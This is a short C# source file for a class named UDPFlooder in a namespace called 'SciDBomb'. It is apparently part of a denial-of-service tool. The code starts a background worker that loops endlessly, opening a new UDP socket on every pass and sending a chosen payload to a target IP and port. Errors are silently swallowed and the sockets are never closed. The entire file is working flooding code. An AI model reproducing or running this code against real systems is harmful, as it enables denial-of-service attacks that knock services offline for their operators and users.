using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.ComponentModel;

namespace SciDBomb
{
    class UDPFlooder
    {
        public bool isFlooding = true;
        private int iFloodCount = 0;
        public static string IP;
        public static int Port;
        public static bool AwaitReply;
        public static string Data;
        private Random rnd = new Random();
        
        public UDPFlooder(string sIP, int iPort, bool bAwaitReply, string sData)
        {
            IP = sIP; Port = iPort; AwaitReply = bAwaitReply; Data = sData;
            BackgroundWorker bw = new BackgroundWorker();
            bw.DoWork += new DoWorkEventHandler(bw_DoWork);
            bw.RunWorkerAsync();
        }

        private void bw_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                byte[] buf = System.Text.Encoding.ASCII.GetBytes(Data);
                IPEndPoint RHost = new IPEndPoint(IPAddressToLong(IP), Port);
                while (isFlooding)
                {
                    iFloodCount++;
                    Socket sck = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                    sck.Blocking = AwaitReply;
                    sck.SendTo(buf, SocketFlags.None, RHost);
                }
            }
            catch { }
        }

        private long IPAddressToLong(string IPAddr)
        {
            System.Net.IPAddress oIP = System.Net.IPAddress.Parse(IPAddr);
            byte[] byteIP = oIP.GetAddressBytes();
            long ip = (long)byteIP[3] << 24;
            ip += (long)byteIP[2] << 16;
            ip += (long)byteIP[1] << 8;
            ip += (long)byteIP[0];
            return ip;
        }
    }
}
